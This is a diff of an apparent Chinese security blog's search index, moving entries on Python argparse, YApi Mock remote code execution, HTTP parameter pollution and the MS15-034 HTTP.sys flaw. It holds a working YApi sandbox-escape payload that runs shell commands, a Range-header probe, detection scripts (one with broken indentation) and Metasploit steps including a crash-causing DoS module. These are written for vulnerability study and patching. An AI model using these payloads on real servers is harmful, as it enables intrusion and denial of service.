@@ -73,6 +73,36 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-argparse</title>
+    <url>//560821a385be.html</url>
+    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
+<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
+<p>语法：</p>
+<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
+<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
+<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
+<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
+<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
+<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
+<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
+<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
+<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
+<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
+<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
+<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
+<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
+<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Openssh命令注入漏洞（CVE-2020-15778）</title>
     <url>//925033d13d8a.html</url>
     <content><![CDATA[<h2 id="Openssh命令注入漏洞（CVE-2020-15778）"><a href="#Openssh命令注入漏洞（CVE-2020-15778）" class="headerlink" title="Openssh命令注入漏洞（CVE-2020-15778）"></a>Openssh命令注入漏洞（CVE-2020-15778）</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p>
@@ -188,36 +218,6 @@
 
 
 <h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python3-argparse</title>
-    <url>//560821a385be.html</url>
-    <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
-<h3 id="ArgumentParser"><a href="#ArgumentParser" class="headerlink" title="ArgumentParser"></a>ArgumentParser</h3><p>作为解析器，用来包含将命令行解析成Python数据类型的全部信息</p>
-<p>语法：</p>
-<p><strong>argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=’-‘, fromfile_prefix_chars=None, argument_default=None, conflict_handler=’error’, add_help=True, allow_abbrev=True, exit_on_error=True)</strong></p>
-<p><strong>prog</strong>: 程序的名称，默认为<code>sys.argv[0]</code></p>
-<p><strong>usage</strong>: 描述程序用途的字符串（默认值：从添加到解析器的参数生成）</p>
-<p><strong>description</strong>: 在参数帮助文档之前显示的文本（默认值：None）</p>
-<p><strong>epilog</strong>: 在参数帮助文档之后显示的文本（默认值：None）</p>
-<p><strong>parents</strong>: 一个<code>ArgumentParser</code>对象的列表，他们的参数也包含在内</p>
-<p><strong>formatter_class</strong>: 用于自定义帮助文档输出格式的类</p>
-<p><strong>prefix_chars</strong>: 可选参数的前缀字符集合（默认值：’ - ‘ ）</p>
-<p><strong>fromfile_prefix_chars</strong>: 当需要从文件中读取其他参数时，用于标识文件名的前缀字符集合（默认值：None）</p>
-<p><strong>argument_default</strong>: 参数的全局默认值（默认值： None）</p>
-<p><strong>conflict_handler</strong>: 解决冲突选项的策略（通常是不必要的）</p>
-<p><strong>add_help</strong>: 为解析器添加一个 -h/–help 选项（默认值： True）</p>
-<p><strong>allow_abbrev</strong>: 如果缩写是无歧义的，则允许缩写长选项 （默认值：True）</p>
-<p><strong>exit_on_error</strong>: 决定当错误发生时是否让 <code>ArgumentParser</code> 附带错误信息退出。 (默认值: True)</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython3 &#x27;</span>+sys.argv[<span class="number">0</span>]+<span class="string">&quot; -u http://baidu.com&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -800,44 +800,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Yapi Mock远程代码执行漏洞</title>
-    <url>//3ec6df390048.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
-<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
-<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
-<p>注册之后新建项目</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
-<p>添加接口</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
-<p>选择高级mock-脚本-开启脚本</p>
-<p>把以下代码粘贴到脚本中</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
-<p>保存代码并预览</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
-<p>2.升级维护版本（非官方）</p>
-<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
-<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
-<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>web应用漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>web应用漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3运算符</title>
     <url>//dbb1ec05ea08.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -1188,6 +1150,136 @@
       </tags>
   </entry>
   <entry>
+    <title>Yapi Mock远程代码执行漏洞</title>
+    <url>//3ec6df390048.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
+<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
+<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
+<p>注册之后新建项目</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
+<p>添加接口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
+<p>选择高级mock-脚本-开启脚本</p>
+<p>把以下代码粘贴到脚本中</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
+<p>保存代码并预览</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
+<p>2.升级维护版本（非官方）</p>
+<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
+<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
+<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>web应用漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>web应用漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HPP参数污染漏洞</title>
+    <url>//4189faf9a367.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
+<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
+<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
+<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
+<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
+<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
+<table>
+<thead>
+<tr>
+<th align="center">web服务器</th>
+<th align="center">获取参数函数</th>
+<th align="center">获取到的参数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP/Apache</td>
+<td align="center">$_GET(“test”)</td>
+<td align="center">last</td>
+</tr>
+<tr>
+<td align="center">JSP/Tomcat</td>
+<td align="center">Request.getParameter(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Perl(CGI)/Apache</td>
+<td align="center">Param(“test”)</td>
+<td align="center">first</td>
+</tr>
+<tr>
+<td align="center">Python/Apache</td>
+<td align="center">getvalue(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+<tr>
+<td align="center">ASP/IIS</td>
+<td align="center">Request.QueryString(“test”)</td>
+<td align="center">ALL</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞可以用于逻辑漏洞，可以造成IDOR，信息泄露，越权等漏洞</p>
+<p>该漏洞是注入型漏洞，可以作为其他漏洞的辅助，也可以用于绕过漏洞的检测和WAF等</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>低危漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
+    <url>//67bda6fdaf83.html</url>
+    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
+<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
+<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器打上了补丁，那么响应状态应该是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span class="string">&#x27;Range&#x27;</span>: <span class="string">&#x27;bytes=0-18446744073709551615&#x27;</span>&#125;</span><br><span class="line">        req = requests.get(<span class="built_in">str</span>(domain), headers = headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Requested Range Not Satisfiable&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;存在HTTP.sys远程代码执行漏洞!&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">b&#x27;The request has an invalid header name&#x27;</span> <span class="keyword">in</span> req.content:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;漏洞已修复&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;IIS服务无法显示漏洞是否存在，需要手动检测&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> __name__== <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        usr_domain = <span class="built_in">input</span>(<span class="string">&#x27;输入域名扫描: &#x27;</span>)</span><br><span class="line">        identify_iis(usr_domain)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">ipAddr = <span class="string">&quot;IP地址&quot;</span>                         <span class="comment"># 这里填写检测的IP</span></span><br><span class="line">hexAllFfff = <span class="string">&quot;18446744073709551615&quot;</span></span><br><span class="line"></span><br><span class="line">req1 = <span class="string">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">req = <span class="string">&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot;</span> + hexAllFfff + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Audit Started&quot;</span>)</span><br><span class="line"></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((ipAddr, <span class="number">80</span>))                     <span class="comment"># 可以手动更改端口</span></span><br><span class="line">client_socket.send(req1.encode())</span><br><span class="line">boringResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&quot;Microsoft&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> boringResp:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*] Not IIS&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    client_socket.close()</span><br><span class="line">    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	client_socket.connect((ipAddr, <span class="number">80</span>))                 <span class="comment"># 可以手动更改端口</span></span><br><span class="line">	client_socket.send(req.encode())</span><br><span class="line">	goodResp = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;Requested Range Not Satisfiable&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[!!] Looks VULN&quot;</span>)</span><br><span class="line">	<span class="keyword">elif</span> <span class="string">b&quot; The request has an invalid header name&quot;</span> <span class="keyword">in</span> goodResp:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Looks Patched&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*] Unexpected response, cannot discern patch status&quot;</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>通过MSF</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">&gt;search ms 15-034</span><br><span class="line">&gt;auxiliary&#x2F;scanner&#x2F;http&#x2F;ms15_034_http_sys_memory_dump      # 检测模块</span><br><span class="line">&gt;auxiliary&#x2F;dos&#x2F;http&#x2F;ms15_034_ulonglongadd                # 攻击模块，可能导致蓝屏</span><br><span class="line">&gt;show options</span><br><span class="line">&gt;set RHOST IP</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.禁用IIS内核缓存</p>
+<p>2.<a href='https://support.microsoft.com/zh-cn/kb/3042553' target='_blank'>官方补丁下载</a></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>命令执行漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CORS（跨域资源共享）配置不当</title>
     <url>//d1ef1b19c260.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -1296,98 +1388,6 @@
       <tags>
         <tag>中危漏洞</tag>
         <tag>跨站类漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HPP参数污染漏洞</title>
-    <url>//4189faf9a367.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a href="https://www.baidu.com/s?wd=aa&amp;wd=bb">https://www.baidu.com/s?wd=aa&amp;wd=bb</a> ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是wd=aa。有的服务器是取第二个参数，也就是wd=bb。有的服务器两个参数都取，也就是wd=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
-<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>以百度为例，当我们提交两个或两个以上的参数时，返回第一个参数的结果</p>
-<p><a href="https://www.baidu.com/s?wd=1&amp;wd=2">https://www.baidu.com/s?wd=1&amp;wd=2</a></p>
-<p>以必应为例，当我们提交两个或两个以上的参数时，返回第最后一个参数的结果</p>
-<p><a href="https://cn.bing.com/search?q=1&amp;q=2">https://cn.bing.com/search?q=1&amp;q=2</a></p>
-<p>以Google为例，当我们提交两个或两个以上的参数时，返回全部参数的结果，参数之间以空格相隔</p>
-<p><a href="https://www.google.com.hk/search?q=1&amp;q=2">https://www.google.com.hk/search?q=1&amp;q=2</a></p>
-<table>
-<thead>
-<tr>
-<th align="center">web服务器</th>
-<th align="center">获取参数函数</th>
-<th align="center">获取到的参数</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">PHP/Apache</td>
-<td align="center">$_GET(“test”)</td>
-<td align="center">last</td>
-</tr>
-<tr>
-<td align="center">JSP/Tomcat</td>
-<td align="center">Request.getParameter(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Perl(CGI)/Apache</td>
-<td align="center">Param(“test”)</td>
-<td align="center">first</td>
-</tr>
-<tr>
-<td align="center">Python/Apache</td>
-<td align="center">getvalue(“test”)</td>
-<td align="center">ALL</td>
-</tr>
-<tr>
-<td align="center">ASP/IIS</td>
